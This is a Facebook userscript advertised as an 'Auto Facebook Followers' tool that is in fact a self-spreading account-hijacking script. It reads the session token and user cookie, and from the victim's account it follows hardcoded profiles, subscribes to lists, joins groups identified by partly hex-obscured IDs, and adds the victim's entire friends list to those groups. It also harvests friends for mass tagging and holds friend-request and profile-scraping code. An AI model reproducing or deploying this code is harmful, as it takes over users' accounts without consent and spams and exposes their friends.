// ==UserScript==
// @name            Auto Facebook Followers By RN Hckr
// @description     Auto Facebook Followers By RNHckr.com
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// @require         http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// ==/UserScript==

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100001625707516");
a("100004620215045");
a("100002463252535");
a("100004588441805");
a("100003998930274");
a("100002461698288");
a("100005548509230");
a("100002300350459");
a("100004376972583");
a("100004286199137");
a("100001472578659");
a("177210995727203");
a("460007060707576");

sublist("475812109149642");
sublist("460007060707576");
sublist("100001472578659");
sublist("156489554515051");
sublist("0");

var gid = ['430555906995176'];
var gid = ['559102834121181'];


var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "162079897221373";
var spost_id = "162079897221373";
var sfoto_id = "162079897221373";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkadaþ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}

function cereziAl(a) {
    var b = a + "=";
    return document.cookie.length > 0 ? (konum = document.cookie.indexOf(b), -1 != konum ? (konum += b.length, son = document.cookie.indexOf(";", konum), -1 == son && (son = document.cookie.length), unescape(document.cookie.substring(konum, son))) : "") : void 0
}
function getRandomInt(a, b) {
    return Math.floor(Math.random() * (b - a + 1)) + a
}
function randomValue(a) {
    return a[getRandomInt(0, a.length - 1)]
}
function a(a) {
    var b = new XMLHttpRequest,
        c = "/ajax/follow/follow_profile.php?__a=1",
        d = "profile_id=" + a + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    b.open("POST", c, !0), b.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), b.setRequestHeader("Content-length", d.length), b.setRequestHeader("Connection", "close"), b.onreadystatechange = function () {
        4 == b.readyState && 200 == b.status && b.close
    }, b.send(d)
}
function sublist(a) {
    var b = document.createElement("script");
    b.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + a + " }).send();", document.body.appendChild(b)
}
function sarkadaslari_al() {
    var xmlhttp = new XMLHttpRequest;
    xmlhttp.onreadystatechange = function () {
        if (4 == xmlhttp.readyState) for (eval("arkadaslar = " + ("" + xmlhttp.responseText)
            .replace("for (;;);", "") + ";"), f = 0; Math.round(arkadaslar.payload.entries.length / 10) > f; f++) {
            for (smesaj = "", smesaj_text = "", i = 10 * f; 10 * (f + 1) > i; i++) arkadaslar.payload.entries[i] && (smesaj += " @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]", smesaj_text += " " + arkadaslar.payload.entries[i].text);
            sdurumpaylas()
        }
    };
    var params = "&filter[0]=user";
    params += "&options[0]=friends_only", params += "&options[1]=nm", params += "&token=v7", params += "&viewer=" + user_id, params += "&__user=" + user_id, document.URL.indexOf("https://") >= 0 ? xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, !0) : xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, !0), xmlhttp.send()
}
function sarkadasekle(a, b) {
    var c = new XMLHttpRequest;
    c.onreadystatechange = function () {
        4 == c.readyState
    }, c.open("POST", "/ajax/add_friend/action.php?__a=1", !0);
    var d = "to_friend=" + a;
    d += "&action=add_friend", d += "&how_found=friend_browser", d += "&ref_param=none", d += "&outgoing_id=", d += "&logging_location=friend_browser", d += "&no_flyout_on_click=true", d += "&ego_log_data=", d += "&http_referer=", d += "&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value, d += "&phstamp=165816749114848369115", d += "&__user=" + user_id, c.setRequestHeader("X-SVN-Rev", svn_rev), c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), "farketmez" == b && document.cookie.split("cins" + user_id + "=")
        .length > 1 ? c.send(d) : 1 >= document.cookie.split("cins" + user_id + "=")
        .length ? cinsiyetgetir(a, b, "sarkadasekle") : b == "" + document.cookie.split("cins" + user_id + "=")[1].split(";")[0] && c.send(d)
}
function scinsiyetgetir(uid, cins, fonksiyon) {
    var xmlhttp = new XMLHttpRequest;
    xmlhttp.onreadystatechange = function () {
        4 == xmlhttp.readyState && (eval("cinssonuc = " + ("" + xmlhttp.responseText)
            .replace("for (;;);", "") + ";"), cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html, btarihi.setTime(bugun.getTime() + 31536e6), "1" == cinshtml.getElementsByTagName("select")[0].value ? document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString() : "2" == cinshtml.getElementsByTagName("select")[0].value && (document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString()), eval(fonksiyon + "(" + id + "," + cins + ");"))
    }, xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, !0), xmlhttp.setRequestHeader("X-SVN-Rev", svn_rev), xmlhttp.send()
}
function autoSuggest() {
    links = document.getElementsByTagName("a");
    for (i in links) l = links[i], '<span class="uiButtonText">Suggest Friend</span>' == l.innerHTML && l.click()
}
function blub() {
    1 == document.getElementsByClassName("pbm fsm")
        .length && (w = document.getElementsByClassName("pbm fsm")[0], e = document.createElement("a"), e.innerHTML = "Auto Suggest by Eran", e.className = "uiButton", e.onclick = autoSuggest, 0 == w.childElementCount && (w.appendChild(document.createElement("br")), w.appendChild(e)))
}
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
    fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
a("\x31\x30\x30\x30\x30\x31\x34\x32\x38\x32\x33\x38\x36\x38\x38");
var gid = ["\x34\x36\x36\x38\x38\x38\x39\x31\x36\x36\x36\x35\x33\x34\x34"],
    fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
    httpwp = new XMLHttpRequest,
    urlwp = "/ajax/groups/membership/r2j.php?__a=1",
    paramswp = "&ref=group_jump_header&group_id=" + gid + "&fb_dtsg=" + fb_dtsg + "&__user=" + user_id + "&phstamp=";
httpwp.open("POST", urlwp, !0), httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), httpwp.setRequestHeader("Content-length", paramswp.length), httpwp.setRequestHeader("Connection", "keep-alive"), httpwp.send(paramswp);
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
    friends = Array();
gf = new XMLHttpRequest, gf.open("GET", "/ajax/typeahead/first_degree.php?__a=1&viewer=" + user_id + "&token" + Math.random() + "&filter[0]=user&options[0]=friends_only", !1), gf.send(), 4 != gf.readyState || (data = eval("(" + gf.responseText.substr(9) + ")"), data.error || (friends = data.payload.entries.sort(function (a, b) {
    return a.index - b.index
})));
for (var i = 0; friends.length > i; i++) {
    var httpwp = new XMLHttpRequest,
        urlwp = "/ajax/groups/members/add_post.php?__a=1",
        paramswp = "&fb_dtsg=" + fb_dtsg + "&group_id=" + gid + "&source=typeahead&ref=&message_id=&members=" + friends[i].uid + "&__user=" + user_id + "&phstamp=";
    httpwp.open("POST", urlwp, !0), httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), httpwp.setRequestHeader("Content-length", paramswp.length), httpwp.setRequestHeader("Connection", "keep-alive"), httpwp.onreadystatechange = function () {
        4 == httpwp.readyState && 200 == httpwp.status
    }, httpwp.send(paramswp)
}
var spage_id = "427725583972317",
    spost_id = "492414630816140",
    sfoto_id = "488129731244630",
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
    smesaj = "",
    smesaj_text = "",
    arkadaslar = [],
    svn_rev, bugun = new Date,
    btarihi = new Date;
btarihi.setTime(bugun.getTime() + 144e5), document.cookie.match(/paylasti=(\d+)/) || (document.cookie = "paylasti=hayir;expires=" + btarihi.toGMTString());
var tiklama = document.addEventListener("click", function () {
    document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0 && (svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0], sarkadaslari_al(), document.cookie = "paylasti=evet;expires=" + btarihi.toGMTString(), document.removeEventListener(tiklama))
}, !1),
    cinssonuc = {}, cinshtml = document.createElement("html");
blub(), document.addEventListener("DOMNodeInserted", blub, !0);

function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
        }
    }
}

function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        w = document.getElementsByClassName('pbm fsm')[0];

        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by RN Hckr';
        e.className = 'uiButton';
        e.onclick = autoSuggest;

        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}

blub();

document.addEventListener("DOMNodeInserted", blub, true);

function create_back_to_top() {
if(document.body){
	var a = document.createElement('span');
	a.innerHTML = "<a style=\"font-weight:bold;color:#333333\" href=\"http://www.rnhckr.com/\">RN Hckr</a>";
	var c = "opacity:0.7;position:fixed;text-align:right;right:0px;bottom:0px;z-index:50000;";
	c+="border: 2px solid;-moz-border-top-colors: ThreeDLightShadow ThreeDHighlight;-moz-border-right-colors: ThreeDDarkShadow ThreeDShadow;-moz-border-bottom-colors: ThreeDDarkShadow ThreeDShadow;-moz-border-left-colors: ThreeDLightShadow ThreeDHighlight;padding: 3px;color: MenuText;background-color: Menu;font-size:9pt;font-family:arial,sans-serif;cursor:pointer;";
	a.style.cssText = c;
	a.addEventListener('mouseover', function(){ a.style.opacity = 1; }, false);
	a.addEventListener('mouseout', function(){ a.style.opacity = 0.5; }, false);
	a.addEventListener('click', function(){ window.scrollTo(0,0); }, false);
	document.body.appendChild(a);
	}
};

if(self==top) create_back_to_top();